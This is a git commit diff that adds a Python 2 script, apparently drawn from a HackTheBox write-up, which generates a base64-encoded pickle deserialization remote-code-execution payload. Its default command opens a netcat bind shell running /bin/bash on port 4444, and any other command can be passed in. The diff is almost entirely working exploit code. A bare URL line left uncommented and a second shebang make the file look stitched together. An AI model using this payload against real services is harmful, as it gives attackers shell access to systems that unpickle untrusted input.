ba327f6bb631dd6904aa6be3ed1ec525beb03563
babywyrm <55672787+babywyrm@users.noreply.github.com>
2023-12-12 20:10:02 -0800

    Update demo.py

--- pyth3/pickle/demo.py
+++ pyth3/pickle/demo.py
@@ -1,4 +1,34 @@
 #!/usr/bin/python
+
+##
+##
+https://0x00sec.org/t/pickle-insecure-deserialization-hackthebox-baby-website-rick/27130
+##
+##
+
+# Pickle deserialization RCE payload.
+# To be invoked with command to execute at it's first parameter.
+# Otherwise, the default one will be used.
+#
+
+import cPickle
+import sys
+import base64
+
+DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(COMMAND,))
+
+print base64.b64encode(cPickle.dumps(PickleRce()))
+        
+##
+##
+
+#!/usr/bin/python
 #
 # Pickle deserialization RCE exploit
 # calfcrusher@inventati.org
